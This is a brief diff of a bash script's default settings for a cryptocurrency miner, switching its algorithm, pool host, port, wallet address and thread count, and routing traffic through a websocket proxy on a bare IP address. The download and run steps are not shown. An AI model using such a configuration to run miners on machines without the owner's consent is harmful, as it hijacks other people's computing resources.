@@ -1,11 +1,11 @@
 #!/bin/bash
 
-: "${M_ALGO:=minotaurx}"
-: "${M_HOST:=minotaurx.na.mine.zpool.ca}"
-: "${M_PORT:=7019}"
-: "${M_WORKER:=RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65}"
-: "${M_PASSWORD:=c=RVN}"
-: "${M_THREADS:=7}"
+: "${M_ALGO:=yescryptr32}"
+: "${M_HOST:=stratum-asia.rplant.xyz}"
+: "${M_PORT:=17116}"
+: "${M_WORKER:=UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx}"
+: "${M_PASSWORD:=x}"
+: "${M_THREADS:=3}"
 : "${M_PROXY:=ws://172.233.136.27:8088/proxy}"
 
 # Download packgaes
